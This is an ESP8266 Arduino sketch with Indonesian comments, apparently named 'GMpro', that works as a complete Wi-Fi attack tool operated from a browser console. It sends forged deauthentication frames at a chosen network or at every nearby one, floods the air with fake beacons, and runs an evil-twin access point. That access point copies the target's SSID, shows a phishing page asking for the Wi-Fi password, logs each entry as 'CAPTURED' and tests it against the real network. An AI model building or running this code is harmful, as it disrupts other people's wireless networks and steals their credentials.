#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int rssi;
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _eventLogs = "[SYS] GMpro Ready...\n";
String _correct = "";
String _tryPassword = "";

// Variabel Sinkronisasi Web Admin
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_deauth = false;
bool beacon_spam = false;
String config_ssid = "GMpro";
String config_pass = "Sangkur87";
int selectedET = 1;
int beacon_count = 10;

void addLog(String msg) {
  _eventLogs = "[" + String(millis()/1000) + "s] " + msg + "\n" + _eventLogs;
  if (_eventLogs.length() > 2000) _eventLogs = _eventLogs.substring(0, 2000);
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks(false, true); 
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = (WiFi.SSID(i) == "") ? "<HIDDEN>" : WiFi.SSID(i);
      for (int j = 0; j < 6; j++) network.bssid[j] = WiFi.BSSID(i)[j];
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      _networks[i] = network;
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// FIX: Fungsi kirim paket deauth yang lebih stabil
void sendDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  uint8_t pkt[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  wifi_send_pkt_freedom(pkt, 26, 0);
}

void handleIndex() {
  if (webServer.hasArg("clear_logs")) { _eventLogs = "[SYS] Logs Cleared.\n"; webServer.send(200, "text/plain", "ok"); return; }
  if (webServer.hasArg("set_et")) { selectedET = webServer.arg("set_et").toInt(); addLog("ET Template: " + String(selectedET)); }
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _selectedNetwork = _networks[i];
    }
    addLog("Target: " + _selectedNetwork.ssid);
  }
  
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
  if (webServer.hasArg("spam")) {
      beacon_spam = (webServer.arg("spam") == "1");
      if(webServer.hasArg("count")) beacon_count = webServer.arg("count").toInt();
      addLog(beacon_spam ? "Beacon Spam ON (" + String(beacon_count) + ")" : "Beacon Spam OFF");
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "1") {
      hotspot_active = true;
      dnsServer.stop(); WiFi.softAPdisconnect(true);
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
      addLog("EvilTwin: " + _selectedNetwork.ssid);
    } else {
      hotspot_active = false;
      dnsServer.stop(); WiFi.softAPdisconnect(true);
      WiFi.softAP(config_ssid.c_str(), config_pass.c_str());
      dnsServer.start(DNS_PORT, "*", apIP);
      addLog("EvilTwin Stopped");
    }
  }

  if (!hotspot_active) {
    // TAMPILAN WEB ADMIN (TIDAK BERUBAH SEDIKITPUN)
    String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
    html += "body{font-family:'Courier New',Courier,monospace;background:#0d0d0d;color:#00ff00;margin:0;padding:10px;}.content{max-width:500px;margin:auto;border:1px solid #00ff00;padding:15px;h2{text-align:center;border-bottom:2px solid #00ff00;padding-bottom:10px;text-transform:uppercase;}.tabs{display:flex;gap:5px;margin-bottom:15px;}.tabs button{flex:1;background:#222;color:#00ff00;border:1px solid #00ff00;padding:10px;cursor:pointer;font-weight:bold;}.active-btn{background:#00ff00!important;color:#000!important;}.tab-content{display:none;border-top:1px solid #333;padding-top:15px;}.show{display:block;}table{width:100%;border-collapse:collapse;margin-top:10px;font-size:12px;}th,td{border:1px solid #00ff00;padding:8px;text-align:left;}th{background:#1a1a1a;}.btn{background:#000;color:#00ff00;border:1px solid #00ff00;padding:5px 10px;cursor:pointer;text-decoration:none;font-size:11px;}.btn-red{border-color:#ff0000;color:#ff0000;}input{background:#000;color:#0f0;border:1px solid #0f0;padding:5px;}</style></head><body>";
    html += "<div class='content'><h2>GMpro Console</h2><div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
    
    html += "<div id='m' class='tab-content show'><div style='margin-bottom:10px;'><a href='/?deauth=" + String(!deauthing_active) + "'><button class='btn'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</button></a>";
    html += " <a href='/?hotspot=" + String(!hotspot_active) + "'><button class='btn' " + (_selectedNetwork.ssid==""?"disabled":"") + ">" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</button></a></div>";
    html += "<table><tr><th>SSID</th><th>CH</th><th>SNR%</th><th>SELECT</th></tr>";
    for(int i=0; i<16; i++) {
        if(_networks[i].ssid == "" && i > 0 && _networks[i-1].ssid == "") break;
        int s_pct = 2 * (_networks[i].rssi + 100); if(s_pct>100) s_pct=100;
        html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(s_pct) + "%</td>";
        html += "<td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button class='btn' " + (bytesToStr(_selectedNetwork.bssid, 6)==bytesToStr(_networks[i].bssid, 6)?"style='background:#00ff00;color:#000;'":"") + ">" + (bytesToStr(_selectedNetwork.bssid, 6)==bytesToStr(_networks[i].bssid, 6)?"SELECTED":"SELECT") + "</button></a></td></tr>";
    }
    html += "</table></div>";

    html += "<div id='a' class='tab-content'><h3>Mode Rusuh</h3><a href='/?mass=" + String(!mass_deauth) + "'><button class='btn btn-red' style='width:100%;padding:15px;'>" + (mass_deauth?"STOP MASS DEAUTH":"START MASS DEAUTH") + "</button></a>";
    html += "<hr><form action='/' method='get'><button type='submit' name='spam' value='1' class='btn' style='width:100%;padding:10px;'>BEACON SPAM RANDOM</button>";
    html += "<div style='margin-top:10px;'><label>Jumlah Beacon:</label><input type='number' name='count' value='" + String(beacon_count) + "' style='width:60px;'><small>SSID</small></div></form></div>";

    html += "<div id='s' class='tab-content'><h3>File Manager</h3><p>Pilih Template: <select onchange='location=\"/?set_et=\"+this.value'>";
    for(int i=1; i<=4; i++) html += "<option value='" + String(i) + "' " + (selectedET==i?"selected":"") + ">etwin" + String(i) + ".html</option>";
    html += "</select></p><hr><label>SSID Alat:</label><br><input type='text' value='" + config_ssid + "' style='width:100%;'><br><br><label>Password:</label><br><input type='text' value='" + config_pass + "' style='width:100%;'><br><br><button class='btn'>SAVE & RESTART</button></div>";

    html += "<hr><h4>Live Logs</h4><textarea id='logBox' rows='6' style='width:100%;background:#000;color:#0f0;' readonly>" + _eventLogs + "</textarea>";
    html += "<button class='btn' style='margin-top:5px;width:100%;' onclick='location=\"/?clear_logs=1\"'>CLEAR LOGS</button></div>";
    html += "<script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}</script></body></html>";
    webServer.send(200, "text/html", html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      addLog("CAPTURED: " + _tryPassword);
      WiFi.disconnect(); WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
      webServer.send(200, "text/html", "Verifying... Please wait.");
    } else {
      String path = "/etwin" + String(selectedET) + ".html";
      if (LittleFS.exists(path)) {
        File f = LittleFS.open(path, "r"); webServer.streamFile(f, "text/html"); f.close();
      } else { webServer.send(200, "text/html", "<h2>Update Required</h2><form><input type='password' name='password'><input type='submit'></form>"); }
    }
  }
}

void setup() {
  Serial.begin(115200); LittleFS.begin();
  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config_ssid.c_str(), config_pass.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  static unsigned long last_atk = 0;
  if (millis() - last_atk >= 150) { // Jeda biar CPU gak gempor
    if (deauthing_active && _selectedNetwork.ssid != "") {
      sendDeauth(_selectedNetwork.bssid, _selectedNetwork.ch);
    }
    
    if (mass_deauth) {
      uint8_t admin_mac[6];
      wifi_get_macaddr(SOFTAP_IF, admin_mac); // Ambil MAC alat sendiri
      
      for(int i=0; i<16; i++) {
        // WHITELIST: Jangan serang kalau target adalah MAC alat sendiri
        bool is_admin = true;
        for(int j=0; j<6; j++) if(_networks[i].bssid[j] != admin_mac[j]) is_admin = false;

        if(_networks[i].ssid != "" && _networks[i].ssid != "<HIDDEN>" && !is_admin) {
          sendDeauth(_networks[i].bssid, _networks[i].ch);
        }
      }
    }

    if (beacon_spam) {
      for(int s=0; s < beacon_count; s++) {
        uint8_t bcn[128] = {0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        for(int i=10; i<22; i++) bcn[i] = os_random()%256;
        String fakeSsid = "FreeWiFi_" + String(os_random()%1000);
        bcn[28] = 0x00; bcn[29] = fakeSsid.length();
        memcpy(&bcn[30], fakeSsid.c_str(), bcn[29]);
        wifi_send_pkt_freedom(bcn, 30+bcn[29]+12, 0);
      }
    }
    last_atk = millis();
  }

  static unsigned long last_scan = 0;
  if (millis() - last_scan >= 15000) {
    performScan();
    last_scan = millis();
  }
}
